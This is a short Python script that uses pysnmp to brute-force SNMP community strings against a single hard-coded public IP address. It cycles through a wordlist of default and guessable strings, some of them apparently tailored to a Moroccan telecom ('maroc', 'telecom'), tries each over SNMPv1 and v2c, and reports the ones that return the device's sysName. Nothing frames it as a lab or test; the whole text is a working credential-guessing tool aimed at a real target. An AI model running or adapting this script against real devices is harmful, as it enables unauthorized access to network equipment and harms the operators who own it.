from pysnmp.hlapi import *

ip = '105.155.252.6'
communities = ['public','private','cisco','CISCO','test','maroc','router','admin',
               'default','secret','write','read','monitor','all','manager','telecom',
               'telco','sysadmin','root','enable','P@ssw0rd','password','snmp','community']
oid = ObjectIdentity('1.3.6.1.2.1.1.5.0')  # sysName

for c in communities:
    for mp in (0, 1):  # جرب SNMPv1 ثم v2c
        err, st, idx, vb = next(
            getCmd(SnmpEngine(), CommunityData(c, mpModel=mp),
                   UdpTransportTarget((ip, 161), timeout=1, retries=0),
                   ContextData(), ObjectType(oid)))
        if err is None and st == 0:
            print(f'[+] FOUND: {c} (v{mp+1}) -> sysName={vb[0].prettyPrint()}')
            break
    else:
        print(f'[-] {c}')
EOF
